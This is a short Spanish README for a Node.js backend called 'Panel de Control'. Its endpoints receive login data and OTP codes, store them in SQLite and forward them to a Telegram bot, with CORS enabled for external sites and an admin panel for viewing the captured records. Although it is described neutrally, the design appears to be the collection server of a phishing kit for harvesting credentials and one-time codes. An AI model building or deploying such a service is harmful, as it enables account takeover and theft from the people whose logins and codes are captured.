# Panel de Control - Backend

Servidor Node.js para gestionar datos de eventos y enviar notificaciones a Telegram.

## Características

- ✅ API REST para recopilar datos
- ✅ Base de datos SQLite integrada
- ✅ Notificaciones automáticas a Telegram
- ✅ Panel web para visualizar datos
- ✅ CORS habilitado para conexiones externas

## Variables de Entorno

Para funcionar correctamente, necesitas configurar:

- `TELEGRAM_TOKEN`: Token de tu bot de Telegram
- `TELEGRAM_CHAT`: ID del chat donde recibirás notificaciones

## Instalación

```bash
npm install
npm start
```

## Endpoints

- `POST /collect` - Recibe datos de login
- `POST /otp` - Recibe códigos OTP
- `GET /api/events` - Obtiene todos los eventos
- `GET /` - Panel web administrativo

## Tecnologías

- Node.js
- Express.js
- SQLite
- Telegram API